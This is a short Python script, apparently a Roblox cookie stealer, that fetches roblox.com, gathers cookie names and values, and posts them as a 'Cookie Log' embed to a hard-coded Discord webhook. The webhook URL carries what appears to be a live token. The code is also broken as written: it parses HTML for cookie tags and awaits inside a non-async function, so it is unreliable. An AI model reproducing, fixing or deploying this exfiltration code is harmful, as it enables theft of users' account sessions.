import requests
from bs4 import BeautifulSoup
import discord

# Discord Webhook settings
WEBHOOK_URL = "https://discord.com/api/webhooks/1466864809336115495/WBtAV0ia3DmKjB1N6bcpCkDKJ8tSzXLC52SpJ7HixtpgzY_gLZlSYuABASAv5OfNWo4s"

# Image URL
IMAGE_URL = "https://th.bing.com/th/id/R.1bf215cfc038b9e3a8d4dbbb0f7d1de0?rik=U0%2fP0ec%2bpKgJMA&pid=ImgRaw&r=0.jpg"

# Cookies URL
COOKIES_URL = "https://roblox.com"  # Replace with the actual cookies URL

def get_cookies(url):
    response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
    soup = BeautifulSoup(response.content, 'html.parser')
    
    cookies = []
    for cookie in soup.find_all('cookie'):
        name = cookie.attrs['name']
        value = cookie.attrs['value']
        cookies.append(f"{name}: {value}")
        
    return cookies

def send_webhook_message(webhook_url, message):
    embed = discord.Embed(title="Cookie Log", description=message)
    embed.set_image(url=IMAGE_URL)  # Set the image URL
    
    webhook = discord.Webhook.from_url(WEBHOOK_URL)
    await webhook.send(embed=embed)

# Example usage
url = COOKIES_URL
cookies = get_cookies(url)
message = "\n".join(cookies) + f"\n\nImage: {IMAGE_URL}"  # Set the image URL

send_webhook_message(WEBHOOK_URL, message)
